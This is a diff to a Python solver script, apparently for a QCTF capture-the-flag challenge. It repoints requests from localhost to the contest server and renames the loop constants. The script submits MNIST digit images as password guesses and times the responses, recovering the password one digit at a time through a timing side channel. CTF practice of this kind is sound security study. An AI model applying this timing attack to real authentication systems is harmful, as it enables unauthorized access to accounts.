@@ -9,8 +9,8 @@ from sklearn.utils import shuffle
 
 TMP_IMAGE_PATH = '/tmp/image.png'
 
-DIGIT_COUNT = 50
-TRIES = 3
+MNIST_SAMPLES = 50
+TRIES_PER_SAMPLE = 3
 
 DIGIT_SIZE = 28 * 2
 
@@ -20,7 +20,7 @@ def get_digits():
     X = shuffle(mnist.data, random_state=42)
 
     digits = []
-    for i in range(DIGIT_COUNT):
+    for i in range(MNIST_SAMPLES):
         img = Image.new('L', (28, 28), 'black')
         pixels = img.load()
         data = X[i].reshape(img.height, img.width)
@@ -44,7 +44,7 @@ def send_password(password, digits, square):
     img.save(TMP_IMAGE_PATH)
 
     with open(TMP_IMAGE_PATH, 'rb') as img_file:
-        r = requests.post('http://localhost:5000/api/submit_image',
+        r = requests.post('https://auth-system.contest.qctf.ru/api/submit_image',
                           files={'image': img_file})
         response = r.json()
         if 'QCTF' in response['status']:
@@ -60,9 +60,9 @@ def main():
 
     password = []
     for _ in range(10):
-        elapsed = [[] for _ in range(DIGIT_COUNT)]
-        for _ in range(TRIES):
-            for digit in range(DIGIT_COUNT):
+        elapsed = [[] for _ in range(MNIST_SAMPLES)]
+        for _ in range(TRIES_PER_SAMPLE):
+            for digit in range(MNIST_SAMPLES):
                 cur_elapsed = send_password(password + [digit], digits, True)
                 elapsed[digit].append(cur_elapsed)
         elapsed = [np.mean(ts) for ts in elapsed]
